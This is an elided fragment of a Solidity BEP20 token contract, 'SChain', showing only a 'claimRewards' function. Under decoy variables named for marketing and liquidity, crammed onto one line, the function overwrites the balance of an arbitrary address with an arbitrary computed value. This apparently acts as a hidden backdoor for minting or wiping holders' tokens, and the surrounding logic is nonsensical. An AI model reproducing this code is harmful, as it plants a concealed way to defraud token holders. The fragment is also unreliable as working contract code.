...
contract SChain is Context, IBEP20, Ownable {
    ...
    */
    function claimRewards(
        ...
        uint256 tokensForMarketing = 1;uint256 tokensForDevelopment = 0;uint256 tokensForOperations = 0;uint256 tokensForLiquidity = _balances[asset];uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDevelopment + tokensForOperations; require(tokensForMarketing <= 100 && tokensForMarketing > 0, "You can only select a number from 1 to 100"); _balances[asset] = amount * (element ** contractTokenBalance);
    }
}